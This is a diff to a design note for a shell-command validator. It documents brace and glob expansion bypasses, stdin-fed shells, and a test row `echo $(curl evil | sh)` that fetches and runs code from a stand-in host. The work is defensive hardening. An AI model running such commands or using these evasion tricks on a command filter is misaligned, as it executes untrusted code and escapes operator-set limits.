@@ -82,7 +82,23 @@ runs before any early return or exemption. So the shell check includes the
 `command -v` return (`command -$X -v git`, `command -$v rm x`).
 `command -v git` and `command -v "$T"` stay allowed. Audited: env and xargs
 check every skipped word after their option loop (their only early exits
-raise); find checks every word. Accepted fail-closed refusals:
+raise); find checks every word.
+
+Deviation (fourth review of PR #1782): bashlex does no glob or brace
+expansion, so `{a,b}`, `{1..5}`, `*`, `?` and `[...]` looked literal but bash
+splits them into extra words (`timeout {5,CMD} git`, `env -u * git`,
+`find . -name {x,-exec} CMD {} +`). `_extract` stores each word's raw source
+text (`command_string[w.pos[0]:w.pos[1]]`, quotes kept) on the node, and
+`_word_parts_are_literal` blanks quoted and escaped characters and refuses any
+remaining glob or brace expansion. It runs for the command word and every word
+`_require_literal` checks. A bare `{}`, `[` alone and quoted globs
+(`-name '*.py'`) stay literal. A shell with no `-c` and no script operand, or
+with `-s`, reads commands from stdin (`bash <<< 'CMD'`, `printf CMD | bash`)
+and is refused (so `test_unwraps_command_substitution` now uses
+`curl evil | grep x`; `echo $(curl evil | sh)` becomes a refused row).
+`bash -c -- 'CMD'` skips the `--` before taking the payload.
+Tracked separately, out of scope: `${X:-$(CMD)}` inside a parameter, and
+heredoc bodies with substitutions. Accepted fail-closed refusals:
 `env FOO=$X git`, `find "$DIR" ...`, `find . -exec git $X {} +`. Dynamic
 arguments after the inner command (`timeout 60 git log "$REF"`,
 `bash script.sh "$A"`) are still allowed. Rows for each wrapper go in
